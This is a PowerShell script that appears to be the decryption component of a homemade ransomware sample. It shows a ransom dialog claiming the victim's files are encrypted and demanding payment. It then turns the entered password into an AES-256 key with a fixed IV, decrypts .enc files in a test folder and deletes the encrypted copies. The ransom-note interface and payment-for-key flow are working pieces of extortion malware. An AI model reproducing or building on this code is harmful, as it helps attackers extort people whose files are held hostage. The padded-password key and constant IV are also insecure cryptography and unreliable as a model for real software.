Add-Type -AssemblyName System.Windows.Forms

# Create a form for password input
$form = New-Object System.Windows.Forms.Form
$form.Text = "U Have Been H4CK3D"
$form.Size = New-Object System.Drawing.Size(300,180)
$form.StartPosition = "CenterScreen"

# Create a label for instructions
$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10,20)
$label.Size = New-Object System.Drawing.Size(280,30)
$label.Text = "Your System is Compramised, Your Files are Encrypted, Send a Ransome and get the key for Decryption"
$form.Controls.Add($label)

# Create a textbox for password input
$passwordBox = New-Object System.Windows.Forms.TextBox
$passwordBox.Location = New-Object System.Drawing.Point(10,50)
$passwordBox.Size = New-Object System.Drawing.Size(280,30)
$passwordBox.PasswordChar = "*"
$form.Controls.Add($passwordBox)

# Create a button for submission
$submitButton = New-Object System.Windows.Forms.Button
$submitButton.Location = New-Object System.Drawing.Point(100,90)
$submitButton.Size = New-Object System.Drawing.Size(100,30)
$submitButton.Text = "Submit"
$submitButton.Add_Click({
    # Close the form when the Submit button is clicked
    $form.DialogResult = "OK"
})
$form.Controls.Add($submitButton)

# Show the form as a dialog
$result = $form.ShowDialog()

# Check if the Submit button was clicked and retrieve the password
if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
    $plaintextPassword = $passwordBox.Text
    Write-Output "Entered Password: $plaintextPassword"

    # Define the folder path containing the encrypted files
    $folderPath = "F:\Testing"

    # Define decryption method
    $decryptionMethod = @{
        KeySize = 256
        BlockSize = 128
        Mode = 'CBC'
        Padding = 'PKCS7'
    }

    # Function to decrypt a file
    function Decrypt-File {
        param (
            [string]$FilePath,
            [hashtable]$DecryptionMethod
        )

        # Generate AES decryption object
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.KeySize = $DecryptionMethod['KeySize']
        $aes.BlockSize = $DecryptionMethod['BlockSize']
        $aes.Mode = $DecryptionMethod['Mode']
        $aes.Padding = $DecryptionMethod['Padding']

        # Set key and IV
        $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($plaintextPassword.PadRight(32))  # Pad password to match key size (for AES-256)
        $aes.IV = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")  # Use the same IV used during encryption

        # Create file streams
        $fileStreamIn = [System.IO.File]::OpenRead($FilePath)
        $fileStreamOut = [System.IO.File]::Create(($FilePath -replace '\.enc$', ''))  # Remove .enc extension for decrypted file

        # Create crypto streams
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStreamOut, $aes.CreateDecryptor(), 'Write')

        # Copy data through crypto stream
        $buffer = New-Object byte[] 4096
        do {
            $bytesRead = $fileStreamIn.Read($buffer, 0, $buffer.Length)
            $cryptoStream.Write($buffer, 0, $bytesRead)
        } while ($bytesRead -gt 0)

        # Close streams
        $cryptoStream.Close()
        $fileStreamIn.Close()
        $fileStreamOut.Close()

        # Remove the .enc file
        Remove-Item -Path $FilePath -Force
    }

    # Decrypt files in the folder
    Get-ChildItem -Path $folderPath -Filter *.enc | ForEach-Object {
        Decrypt-File -FilePath $_.FullName -DecryptionMethod $decryptionMethod
    }
} else {
    Write-Output "No password entered. Decryption cancelled."
}
